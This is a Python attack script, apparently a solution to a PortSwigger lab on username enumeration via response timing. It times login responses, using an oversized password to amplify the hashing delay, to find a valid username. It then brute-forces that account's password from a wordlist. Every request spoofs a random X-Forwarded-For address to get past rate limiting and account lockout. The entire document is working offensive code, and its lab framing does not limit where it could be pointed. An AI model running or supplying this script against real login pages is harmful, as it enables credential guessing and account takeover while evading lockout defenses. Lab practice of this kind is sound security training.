import requests
import argparse
import time
import sys
import random

"""
PortSwigger Lab: Username enumeration via responses on timing.

This script performs a two-phase attack:
1. Username Enumeration (Timing Attack): Identifying a valid username by 
   measuring the server's response time (Password hashing delay).
2. Password Brute-force: Attempting a dictionary attack on the identified user.

Features:
- IP Rotation via 'X-Forwarded-For' to bypass rate limiting.
- Timing analysis using response.elapsed.
- Session management for efficiency.
"""

def get_random_ip():
    """Generates a random IP string for header spoofing."""
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

def load_wordlist(path):
    """Loads a file and returns a list of lines."""
    try:
        with open(path, "r") as f:
            return f.read().splitlines()
    except FileNotFoundError:
        print(f"[!] Error: File not found at {path}")
        sys.exit(1)

def brute_force_login(url, u_path, p_path):
    usernames = load_wordlist(u_path)
    passwords = load_wordlist(p_path)
    session = requests.Session()
    found_username = None
    start_time = time.time()

    # --- Phase 1: USERNAME ENUMERATION (TIMING) ---
    print(f"[*] Starting timing-based enumeration on {len(usernames)} usernames...")
    
    for user in usernames:
        # Rotating IP to bypass account lockout/rate-limiting
        headers = {"X-Forwarded-For": get_random_ip()}
        print(f"[-] Testing username: {user}\033[K", end="\r")
        
        # Using a long password to amplify the hashing delay
        data = {"username": user, "password": "A" * 1000}
        
        try:
            response = session.post(url, data=data, headers=headers)
            
            # Threshold: 2.5s is usually enough to identify the hashing delay
            if response.elapsed.total_seconds() > 2.5:
                print(f"\n[+] Valid username identified: {user}")
                found_username = user
                break
        except requests.exceptions.RequestException as e:
            print(f"\n[!] Connection error: {e}")
            return

    if not found_username:
        print("\n[!] No valid username identified via timing anomalies.")
        return

    # --- Phase 2: PASSWORD BRUTE-FORCING ---
    print(f"[*] Starting brute-force for user: {found_username}")
    
    for pwd in passwords:
        headers = {"X-Forwarded-For": get_random_ip()}
        print(f"[-] Testing password: {pwd}\033[K", end="\r")
        
        data = {"username": found_username, "password": pwd}
        
        # allow_redirects=False is crucial to catch the 302 status code
        response = session.post(url, data=data, headers=headers, allow_redirects=False)

        if response.status_code == 302:
            print(f"\n[!!!] SUCCESS! Credentials found: {found_username}:{pwd}")
            print(f"[✔] Total time elapsed: {time.time() - start_time:.2f} seconds")
            return

    print("\n[!] Password not found in the provided wordlist.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Advanced Brute-force script (Timing & IP Rotation)")
    parser.add_argument("-u", "--url", required=True, help="Login URL of the lab")
    parser.add_argument("-U", "--usernames", required=True, help="Usernames wordlist")
    parser.add_argument("-P", "--passwords", required=True, help="Passwords wordlist")
    
    args = parser.parse_args()

    print("="*50)
    print(" PORTWIGGER AUTHENTICATION BRUTE-FORCE TOOL ")
    print("="*50)
    
    brute_force_login(args.url, args.usernames, args.passwords)